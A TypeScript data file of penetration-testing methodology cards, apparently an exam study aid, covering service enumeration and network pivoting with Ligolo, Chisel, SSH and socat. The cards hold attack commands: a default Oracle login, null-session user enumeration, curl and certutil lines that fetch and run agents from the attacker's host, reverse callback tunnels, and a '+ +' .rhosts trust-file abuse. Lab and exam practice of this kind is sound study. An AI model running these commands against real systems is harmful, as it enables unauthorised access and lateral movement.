import type { Technique } from "./methodology";

export const COVER: Technique[] = [
  {
    id: "svc-oracle",
    section: "Services",
    title: "Oracle",
    look: "1521 from Kali. sqlplus is often not installed. If which prints nothing, the nmap version is the whole check. One default login. Then leave.",
    cmd: `# FIRST
nmap -Pn -sV -p 1521 <ip>
which sqlplus
# TALK, only when which printed a path
sqlplus system/manager@//<ip>:1521/ORCL
# the service name is the one nmap printed. ORCL is the one guess.
# INSIDE
SELECT USER FROM dual;
SELECT username FROM all_users;
# USE IT
# a password in a table you were allowed to read
# no sqlplus: stop. Do not spend the hour installing a client.`,
    alive: "Connected to Oracle, or the banner names a version you already know how to talk to.",
    dead: "which sqlplus is empty, or ORA-01017. The default was wrong. Do not hydra Oracle.",
    next: "A password you read goes to SSH or the web login. The listener port is finished.",
  },
  {
    id: "svc-https",
    section: "Services",
    title: "HTTPS",
    look: "443 is the same application as 80 until the certificate or the vhost says otherwise. TLS is not the bug. The first check is the certificate name, then the same HTTP cards.",
    cmd: `# FIRST
curl -kI https://<ip>/
openssl s_client -connect <ip>:443 </dev/null 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName
# TALK. -k accepts the bad certificate. The name from the certificate goes in hosts.
echo '<ip> app.exam.local' | sudo tee -a /etc/hosts
curl -kI https://app.exam.local/
gobuster dir -k -u https://app.exam.local/ -w /usr/share/wordlists/dirb/common.txt -q
# USE IT
# same Web section as HTTP: one parameter, then LFI, SQLi, upload, command, SSTI
# a different title on 443 than on 80 means a second app. Enumerate it. Do not assume it is a redirect.`,
    alive: "A hostname in the certificate, or a path that does not exist on port 80.",
    dead: "The same default page as port 80 and a certificate with no useful name. One app. Leave 443.",
    next: "Web section, starting at identify. Do not run a TLS scanner and call that the assessment.",
  },
  {
    id: "svc-netbios",
    section: "Services",
    title: "NetBIOS",
    look: "137/udp and 139/tcp. The first check is the computer name and whether this is WORKGROUP or a domain. NetBIOS does not give you a shell. It gives you the name you then use on SMB.",
    cmd: `# FIRST
nbtscan <ip>
nmblookup -A <ip>
nmap -Pn -sU -p 137 --script nbstat <ip>
# TALK. 139 is the session port. Anonymous RPC is the RPC card.
enum4linux-ng -A <ip>
nxc smb <ip> -u '' -p '' --users
# USE IT
# a domain name in the reply means the AD section once you have a user
# WORKGROUP means local users and local shares only
# names from the list go into the SMB card. They are not a wordlist today.`,
    alive: "A computer name, a workgroup or domain, and at least one username.",
    dead: "Timeout on 137 and 139 closed. SMB on 445 can still exist. Go to the SMB card.",
    next: "SMB shares with the names you just got. Do not spray them.",
  },
  {
    id: "svc-ntp",
    section: "Services",
    title: "NTP",
    look: "UDP 123. The first check is whether it answers, then whether monlist leaks client addresses. This is not a shell. It is a list of machines that talked to this clock.",
    cmd: `# FIRST
sudo nmap -Pn -sU -p 123 --script ntp-info <ip>
ntpq -c readvar <ip>
# TALK
ntpdc -c monlist <ip>
# older ntpq
ntpq -c monlist <ip>
# USE IT
# addresses in the monlist that sit inside the exam range get a folder and a scan
# an address on the internet does not`,
    alive: "A version line, or a short list of internal client IPs.",
    dead: "Timeout, or monlist says the command is restricted. Stop. Do not look for an NTP exploit.",
    next: "Scan the internal clients you did not already have. Then come back to the host you were on.",
  },
  {
    id: "svc-rlogin",
    section: "Services",
    title: "rlogin, rsh, rexec",
    look: "512 rexec, 513 rlogin, 514 rsh. The first check is a user you already have, or a .rhosts file you can already read. These are not a password attack. If your notes say rlc, this is that card.",
    cmd: `# FIRST. Does anything answer?
nc -nv <ip> 513
nc -nv <ip> 512
# TALK, only with a user you already found
rlogin -l <user> <ip>
rsh -l <user> <ip> id
# USE IT. The bug is a trust file, usually found on NFS or a share.
# .rhosts or /etc/hosts.equiv containing + +
# or your Kali IP written next to a username
# write that file only if the share is no_root_squash or you already own the directory
# then, from Kali, as that user name
rlogin -l <user> <ip>`,
    alive: "A shell with no password, because the host trusts the name you used.",
    dead: "Connection refused, or password required and you do not have one. Close it. Do not hydra rlogin.",
    next: "The shell is a normal Linux landing. sudo -l before anything else.",
  },
  {
    id: "tun-which",
    section: "Tunneling",
    title: "Which tunnel",
    look: "You already proved there is a second network or a port on 127.0.0.1. Pick one tool and one direction. Do not start Ligolo and Chisel and SSH at the same time.",
    cmd: `# Direction first
# Kali must reach their port: ssh -L, or Chisel R:port, or Ligolo plus a route
# They must reach a port on Kali: ssh -R, or Ligolo listener_add
# You want many ports on many hosts: Ligolo. Not SOCKS.
# You want a few tools aimed at one or two hosts: ssh -D or Chisel R:socks, then proxychains4.conf
# Which binary
# SSH already works: -L one port, -D for SOCKS, -R for a callback. No upload.
# Shell, and curl -m 3 http://<KALI>/ answers: Chisel or Ligolo may dial out
# That curl hangs: nothing you upload can dial Kali. Listener goes on the pivot.
# Flags you actually choose
# ssh -N            tunnel only, no shell. -f backgrounds it.
# chisel --reverse  listener is created on Kali, which is what you want
# ligolo -selfcert  you do not bring a certificate
# After a SOCKS tunnel: the proxychains4.conf card. Ligolo skips that file.`,
    alive: "You can name the one tool and the one direction before you upload a binary.",
    dead: "You uploaded three agents because the first one did not connect in ten seconds. Read the failure card.",
    next: "The tunnel builder on this page fills the commands from your addresses and draws which side can reach which network. Then the matching card.",
  },
  {
    id: "tun-ligolo-agent",
    section: "Tunneling",
    title: "Ligolo agent, both OS",
    look: "The proxy is already listening on Kali. The agent is a release binary, the same OS and arch as the target. A 441-byte file is the GitHub page.",
    cmd: `# Kali, the files are the release assets you already downloaded
python3 -m http.server 80
file agent agent.exe
# Linux target
curl -o /tmp/agent http://<KALI>/agent
chmod +x /tmp/agent
/tmp/agent -connect <KALI>:11601 -ignore-cert
# Windows target
certutil -urlcache -split -f http://<KALI>/agent.exe C:\\Users\\Public\\agent.exe
C:\\Users\\Public\\agent.exe -connect <KALI>:11601 -ignore-cert
# proxy console, not bash
session
start`,
    alive: "Agent joined from that host, and start says the tunnel interface is up.",
    dead: "connection refused: the proxy is not listening, or the port is wrong. timeout: the target cannot see <KALI>. i/o timeout after start: you added the route before start. GLIBC or 'not a valid Win32' means the wrong binary.",
    next: "Add the route, then nmap the new subnet with no proxychains.",
  },
  {
    id: "tun-ligolo-back",
    section: "Tunneling",
    title: "Ligolo callback",
    look: "The internal host cannot reach your Kali IP. Penelope stays on Kali. listener_add opens a port on the agent and carries the connection back to that Penelope.",
    cmd: `# Penelope is already on Kali 443
# proxy console, after start
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
listener_list
# the internal victim connects to the PIVOT address, not to Kali
# payload LHOST is the pivot's internal IP
# LPORT is 443, the port you just added
# double hop: a second agent, deeper in, joins through this listener
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# second agent
./agent -connect <PIVOT>:11601 -ignore-cert`,
    alive: "listener_list shows the port, and a callback lands in Penelope when the payload points at the pivot.",
    dead: "The payload pointed at your VPN address. The internal host has no route there. Point it at the pivot. Or 443 on the pivot is already a web server. Pick another port on both sides.",
    next: "The new shell is a new host. Full methodology. Add a route for the second subnet before you scan it.",
  },
  {
    id: "tun-chisel-win",
    section: "Tunneling",
    title: "Chisel on Windows",
    look: "Same reverse server as the Linux card. The client is chisel.exe, 64-bit if systeminfo says x64. You still need the target to be able to reach Kali.",
    cmd: `# Kali
chisel server -p 8000 --reverse
python3 -m http.server 80
# Windows
certutil -urlcache -split -f http://<KALI>/chisel.exe C:\\Users\\Public\\chisel.exe
C:\\Users\\Public\\chisel.exe client <KALI>:8000 R:socks
# one internal web port onto Kali 8081
C:\\Users\\Public\\chisel.exe client <KALI>:8000 R:8081:127.0.0.1:80
# Kali, SOCKS. Confirm the bottom of proxychains4.conf is this one line.
# socks5 127.0.0.1 1080
proxychains -q nxc smb <internal> -u <user> -p '<pass>'`,
    alive: "The server prints a session, and either 127.0.0.1:8081 answers or nxc through proxychains prints [+].",
    dead: "The exe is 441 bytes, or 'connect: connection refused' because nothing is on 8000. A timeout is routing, not a broken chisel.",
    next: "Service cards through the proxy, with -sT if you nmap. Ligolo instead if you are about to scan a /24.",
  },
  {
    id: "tun-ssh-r",
    section: "Tunneling",
    title: "SSH remote forward",
    look: "You have SSH on the pivot, and a host behind it must connect outbound to you. -R is the opposite of -L. -L brings their port to you. -R takes your port to them.",
    cmd: `# -N does not open a shell. Leave this terminal running.
# Kali 443 (Penelope) becomes the pivot's port 4444
ssh -N -R 127.0.0.1:4444:127.0.0.1:443 <user>@<pivot>
# the internal host then connects to the pivot, not to Kali
# LHOST=<pivot> LPORT=4444
# if the listener must be on every interface of the pivot, sshd needs GatewayPorts
ssh -N -R 0.0.0.0:4444:127.0.0.1:443 <user>@<pivot>
# check, on the pivot
ss -tlnp | grep 4444`,
    alive: "ss on the pivot shows 4444 listening, and a payload aimed at the pivot lands in Penelope.",
    dead: "4444 is not listening: the SSH session died, or sshd refused the remote bind. Use 127.0.0.1 on the pivot and connect from the pivot itself, or switch to Ligolo listener_add.",
    next: "One callback. Do not also start Chisel.",
  },
  {
    id: "tun-socat",
    section: "Tunneling",
    title: "One port, no agent",
    look: "You need a single TCP port and the pivot can reach both sides. socat or netsh. Do not build a SOCKS proxy for one website.",
    cmd: `# pivot can see Kali and the internal host
# Linux pivot. Internal clients hit the pivot on 8080 and land on Kali 80.
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<KALI>:80
# the other direction: Kali hits the pivot, pivot opens the internal port
# run this on the pivot
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<internal>:80
# then from Kali
curl http://<pivot>:8080/
# Windows pivot, needs a local admin shell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=<internal> connectport=80
netsh interface portproxy show all`,
    alive: "curl to the pivot shows the internal site, or the internal host reaches a listener on Kali.",
    dead: "socat is not installed and apt cannot run. Use SSH -L or Chisel. netsh access denied means you are not admin. Do not install a package on the exam box if a binary you already have will do it.",
    next: "Enumerate that one service. Tear the forward down when the host is done.",
  },
  {
    id: "tun-fail",
    section: "Tunneling",
    title: "When the tunnel is dead",
    look: "Seven failures. Each one has a cause. None of them is 'try a different exploit'.",
    cmd: `# 1 timeout from the agent to Kali
#    the target has no route to your VPN IP. Prove it: curl -m 3 http://<KALI>/
#    if that hangs, the agent will hang. Use a listener on the pivot instead.
# 2 connection refused
#    nothing is listening on that Kali port. Start the proxy or the chisel server first.
# 3 file exists, ligolo interface
sudo ip link delete ligolo
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
# 4 route added, still no replies
#    you routed before start, or the subnet mask is wrong. Delete it and add it after start.
sudo ip route del 172.16.0.0/24
# 5 every nmap port looks open
#    you used -sS through SOCKS. Re-run -sT.
# 6 binary exits immediately
file agent chisel
#    HTML or 441 bytes. Download the release again.
# 7 you pointed a tool at 127.0.0.1 and got Kali
#    SOCKS to 127.0.0.1 is you. Chisel uses R:port:127.0.0.1:port.
#    Ligolo uses 240.0.0.1 after start. Do not route 127.0.0.0/8.`,
    alive: "The one failure you actually have is fixed and the session stays up.",
    dead: "You are on failure 1 and you keep re-uploading the agent. The network did not change.",
    next: "Back to the host you can already reach. Finish it before you invent a second pivot.",
  },
];
